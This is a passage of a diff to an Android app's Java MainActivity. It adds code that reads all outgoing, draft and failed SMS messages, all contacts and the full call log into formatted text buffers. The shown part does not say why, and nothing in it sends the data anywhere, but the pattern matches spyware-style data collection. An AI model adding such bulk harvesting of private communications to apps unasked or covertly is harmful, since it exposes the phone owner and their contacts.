+                        sbout.append("-------(" + out + ")--------\nClass -------> M-OutBox\nAddress---> " + namb + "\nName---> " + nombre + "\nThread Id---> " + threadid + "\nType---> " + typ + "\nDate---> " + dateAsText + "\nBody---> " + bod + "\n");
                         sbout.append("\n---------------------------------------\n");
                     }
                 }
@@ -642,9 +738,11 @@ public class MainActivity extends AppCompatActivity  {
                 Log.e(kon.TAGGED, "Msg->Out Loop >");
             }
 
+            Log.e(kon.TAGGED, "Parser_SMS Out->Finished at >"+out);
+
+            int draft = 0;
             try {
-                Thread.sleep(1000);
-                int draft = 0;
+                Thread.sleep(50);
                 sbdraft = new StringBuffer();
                 Uri smurdraft = Uri.parse("content://sms/draft");
                 Cursor smcusdraft = getContentResolver().query(smurdraft, null, null, null, null);
@@ -665,7 +763,7 @@ public class MainActivity extends AppCompatActivity  {
                         String bodi = smcusdraft.getString(smcusdraft.getColumnIndexOrThrow("body"));
                         smcusdraft.moveToNext();
                         draft++;
-                        sbdraft.append("-------(" + draft + ")--------\nClass -------> M-Received\nAddress---> " + recv + "\nSenda Name ----->" + seda + "\nName ----->" + nombr + "\nThread Id ----->" + threadi + "\nTime Stamp ----->" + RilD + "\nContent---> " + bodi + "\n");
+                        sbdraft.append("-------(" + draft + ")--------\nClass -------> M-Drafts\nAddress---> " + recv + "\nSenda Name ----->" + seda + "\nName ----->" + nombr + "\nThread Id ----->" + threadi + "\nTime Stamp ----->" + RilD + "\nContent---> " + bodi + "\n");
                         sbdraft.append("\n---------------------------------\n");
                     }
                 }
@@ -674,9 +772,11 @@ public class MainActivity extends AppCompatActivity  {
                 Log.e(kon.TAGGED, "Msg->Draft Loop >");
             }
 
+            Log.e(kon.TAGGED, "Parser_SMS Draft->Finished >"+draft);
+
+            int failed = 0;
             try {
-                Thread.sleep(1000);
-                int draft = 0;
+                Thread.sleep(50);
                 sbfailed = new StringBuffer();
                 Uri smurfailed = Uri.parse("content://sms/failed");
                 Cursor smcusfailed = getContentResolver().query(smurfailed, null, null, null, null);
@@ -696,8 +796,8 @@ public class MainActivity extends AppCompatActivity  {
                         String RilD = sdf1.format(resultdate);
                         String bodi = smcusfailed.getString(smcusfailed.getColumnIndexOrThrow("body"));
                         smcusfailed.moveToNext();
-                        draft++;
-                        sbdraft.append("-------(" + draft + ")--------\nClass -------> M-Received\nAddress---> " + recv + "\nSenda Name ----->" + seda + "\nName ----->" + nombr + "\nThread Id ----->" + threadi + "\nTime Stamp ----->" + RilD + "\nContent---> " + bodi + "\n");
+                        failed++;
+                        sbdraft.append("-------(" + failed + ")--------\nClass -------> M-Failed\nAddress---> " + recv + "\nSenda Name ----->" + seda + "\nName ----->" + nombr + "\nThread Id ----->" + threadi + "\nTime Stamp ----->" + RilD + "\nContent---> " + bodi + "\n");
                         sbdraft.append("\n---------------------------------\n");
                     }
                 }
@@ -705,11 +805,93 @@ public class MainActivity extends AppCompatActivity  {
             } catch (InterruptedException e) {
                 Log.e(kon.TAGGED, "Msg->Failed Loop >");
             }
+
+            Log.e(kon.TAGGED, "Parser_SMS Failed->Finished >"+failed);
+            Log.e(kon.TAGGED, "Parser_SMS->Finished >");
         }
-        public void Parser_Logs(){}
-        public void Parser_Calls(){}
-        public void Parser_Activity(){}
-        public void Parser_SD(){}
+
+        public void Parser_Contacts() {
+            int cont = 0;
+            try {
+                Thread.sleep(50);
+                sbcont = new StringBuffer();
+                Cursor casa = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+                while (casa.moveToNext()) {
+                    String nam = casa.getString(casa.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    String numba = casa.getString(casa.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    cont++;
+                    sbcont.append("\n-------(" + cont + ")--------\nName--> " + nam + "\n" + "Number--> " + numba + "\n-------------------------\n");
+                }
+                casa.close();
+
+            } catch (InterruptedException e) {
+                Log.e(kon.TAGGED, "Conts->SavedConts Loop >");
+            }
+
+            Log.e(kon.TAGGED, "Parser_Contacts->Finished at >"+cont);
+        }
+
+        @RequiresApi(api = Build.VERSION_CODES.M)
+        public void Parser_Logs() {
+            int coulog=0;
+            try {
+                Thread.sleep(50);
+                sblog = new StringBuffer();
+                if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
+                    return;
+                }
+
+                Cursor curlog = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
+                int sav=curlog.getColumnIndex(CallLog.Calls.CACHED_NAME);
+                int senda=curlog.getColumnIndex(CallLog.Calls.NUMBER);
+                int typ= curlog.getColumnIndex(CallLog.Calls.TYPE);
+                int dat=curlog.getColumnIndex(CallLog.Calls.DATE);
+
+                int dura= curlog.getColumnIndex(CallLog.Calls.DURATION);
+                while (curlog.moveToNext()){
+                    String phnum=curlog.getString(senda);
+                    String saved=curlog.getString(sav);
+                    String calltype=curlog.getString(typ);
+                    String datee=curlog.getString(dat);
+
+                    long daty = Long.valueOf(datee);
+                    SimpleDateFormat sdf1 = new SimpleDateFormat("yyyy MMM dd HH:mm:ss");
+                    Date resultdate = new Date(daty);
+                    String dtorn=sdf1.format(resultdate);
+
+                    String span=curlog.getString(dura);
+                    coulog++;
+                    String calty=null;
+                    int typcall=Integer.parseInt(calltype);
+
+                    switch (typcall){
+                        case CallLog.Calls.OUTGOING_TYPE:
+                            calty="Outgoing ";
+                            break;
+                        case CallLog.Calls.INCOMING_TYPE:
+                            calty="Incoming";
+                            break;
+                        case CallLog.Calls.MISSED_TYPE:
+                            calty="Missed ";
+                            break;
+                        case CallLog.Calls.BLOCKED_TYPE:
+                            calty="Blocked ";
+                            break;
+                        case CallLog.Calls.REJECTED_TYPE:
+                            calty="Rejected ";
+                            break;
+                    }
+                    sblog.append("\n-------("+coulog+")--------\nSaved---> "+saved+ "\nCaller---> "+phnum+"\nType---> "+calty+"\nDate--->"+dtorn+"\nDuration--->"+span+" Seconds");
+                    sblog.append("\n---------------------------------\n");
+                }
+                curlog.close();
+            } catch (InterruptedException e) {
+                Log.e(kon.TAGGED, "Logs->Calls Loop >");
+            }
+
+            Log.e(kon.TAGGED, "Parser_Logs->Finished at >"+coulog);
+        }
+
     }
 
 }
